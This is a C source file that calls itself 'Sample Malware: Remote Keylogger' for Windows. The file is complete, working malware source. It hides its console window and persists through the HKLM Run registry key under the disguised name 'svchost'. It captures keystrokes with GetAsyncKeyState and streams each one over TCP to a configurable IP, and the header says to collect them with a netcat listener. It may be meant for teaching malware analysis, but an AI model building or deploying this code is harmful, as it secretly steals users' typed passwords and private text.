/*-------------------------------------------------------------------------------------------------
 *
 *      Sample Malware: Remote Keylogger
 *      Function      : Sends keystrokes to DEFAULT_IP (preprocessor directive)
 *      Requirements  : A netcat server should be available at the DEFAULT_IP to accept the connection
 *                      Use "nc -nvvl -p27015" to start the netcat server
 * 
 *-----------------------------------------------------------------------------------------------
 *
 *        Best built in Visual Studio 10
 *          Porject settings (Configuration Properties):
 * 
 *              1. C/C++ --> Advanced --> Calling convention
 *                 Set __stdcall (Gz)
 * 
 *              2. C/C++ --> Code Generation --> Buffer Security Check
 *                 Set NO
 * 
 *              3. Linker --> General --> Enable Incremental Linking
 *                 Set NO
 * 
 *              4. Linker --> System --> SubSystem
 *                 Set CONSOLE
 *
 *-----------------------------------------------------------------------------------------------*/

#define __DEBUG__
//#define __RECEV__

#define DEFAULT_PORT "27015"
#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_BUFLEN 512

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif


#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>
#include<stdlib.h>
#include<string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"user32.lib") 
#pragma comment(lib, "advapi32")
#pragma runtime_checks( "[runtime_checks]", off )
#define BUFSIZE 80

int test_key(void);
int create_key(char *);
int get_keys(void);

int main(void){
    /* creating stealth (window is not visible) */
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

    int test,create;
    /* check if key is available for opening */
    test=test_key();

    /* create key */
    if (test==2){
        /* the path in which the file needs to be */
       char *path="c:\\%windir%\\svchost.exe";
       create=create_key(path);
    }

    int t=get_keys();
    return t;
}  

int get_keys(void){
    
    WSADATA wsaData;
    int iResult;

    /* Initialize Winsock */
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {    return 0; }

    /* Creating socket for client */
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    /* Resolve the server address and port */
    iResult = getaddrinfo(DEFAULT_IP, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) { WSACleanup(); return 0; }

    SOCKET ConnectSocket = INVALID_SOCKET;

    /* Attempt to connect to the first address returned by
     * the call to getaddrinfo
     */
    ptr=result;

    /* Create a SOCKET for connecting to server */
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return 0;
    }


    /* Connect to server */
    iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }
    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET) { WSACleanup(); return -1; }
    int recvbuflen = DEFAULT_BUFLEN;
    char sendbuf[] = {0, 0};

    while(1){
        Sleep(100);
        for(char character=0x30;character<=0x5A;character++){
            if(GetAsyncKeyState(character)&0x1==0x1){
                /* Send charector */
                sendbuf[0] = character;
                if (send(ConnectSocket, sendbuf, 1, 0) == SOCKET_ERROR) {
                    closesocket(ConnectSocket);
                    WSACleanup();
                    return -1;
                }
                break;
            }    
        }
    }

    return EXIT_SUCCESS;                            
}                                                

int test_key(void){
    int check;
    HKEY hKey;
    char path[BUFSIZE];
    DWORD buf_length=BUFSIZE;
    int reg_key;

    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
    if(reg_key!=0){    
        check=1;
        return check;
    }        

    reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);

    if((reg_key!=0)||(buf_length>BUFSIZE))
        check=2;
    if(reg_key==0)
        check=0;

    RegCloseKey(hKey);
    return check;  
}

int create_key(char *path){
   int reg_key,check;

   HKEY hkey;

   reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);
   if(reg_key==0){
        RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));
        check=0;
        return check;
    }
    if(reg_key!=0)
        check=1;
    
    return check;
}